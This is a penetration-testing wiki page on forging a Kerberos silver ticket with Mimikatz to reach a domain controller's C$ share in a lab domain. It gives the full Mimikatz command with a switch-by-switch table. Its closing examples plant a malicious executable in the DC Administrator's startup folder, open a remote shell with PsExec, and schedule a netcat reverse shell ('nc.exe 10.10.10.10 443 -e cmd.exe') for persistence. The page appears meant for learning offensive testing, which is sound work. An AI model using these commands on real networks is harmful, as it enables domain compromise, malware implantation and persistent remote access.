# Silver Ticket

## Description

### Notes

* Silver ticket is a valid TGS where a Golden ticket is a TGT
* Encrypted and signed by the NTLM hash of the service account
* Services only allow access to the services themselves

## Scenario

* Domain Controller **(DC01)**
* Workstation **(Workstation-01)**

This scenario assumes compromise where the computer account hash for DC01$ has already been revealed through one of the many methods found in this [**Link**](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/golden-ticket#methods-of-krbtgt-hash-retrieval).

Here we are running as the local administrator on the **Workstation-01** system. Attempting to list the directory contents of C$ on the Domain Controller shows we are unable to do so (the local administrator has no permission over the C: drive on the DC).

From the workstation we are able to make use of Mimikatz to forge a silver ticket using the NTLM machine account for the DC.

```bash
# Mimikatz
kerberos::golden /domain:security.local /sid:S-1-5-21-4138410741-468136197-2756728127 /target:dc01.security.local /service:CIFS /rc4:e4b5e471621119551fcf3feb9940efe1 /user:administrator /ptt
```

### Command Breakdown

| Switch           | Description                             |
| ---------------- | --------------------------------------- |
| kerberos::golden | Module name                             |
| /domain:         | Domain FQDN                             |
| /sid:            | Domain SID                              |
| /target:         | Target FQDN                             |
| /service:        | SPN name of service to create TGS for   |
| /rc4:            | NTLM hash of the service account (DC01) |
| /user:           | Username for which the TGT is generated |
| /ptt             | Injects ticket into current process     |

Now the ticket has been created and injected into the current process (/ptt) we can use the command below to open a new command prompt from Mimikatz whilst retaining the ticket.

```bash
misc::cmd
```

We are then able to list the C$ share of the Domain Controller.

```bash
dir \\dc01.security.local\c$
```

Some examples commands which can now be performed on the domain controller

```bash
# Map drive
net use Z: \\dc01.security.local\C$

# Copy malware to Domain Administrator startup folder on DC
copy .\MaliciousFile.exe "\\dc01.security.local\c$\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# CMD 
.\PsExec.exe -accepteula \\dc01.security.local cmd

# Netcat
schtasks /create /sc minute /mo 1 /tn "Persistence" /tr 'c:\Users\Administrator\Downloads/nc.exe 10.10.10.10 443 -e cmd.exe'
```
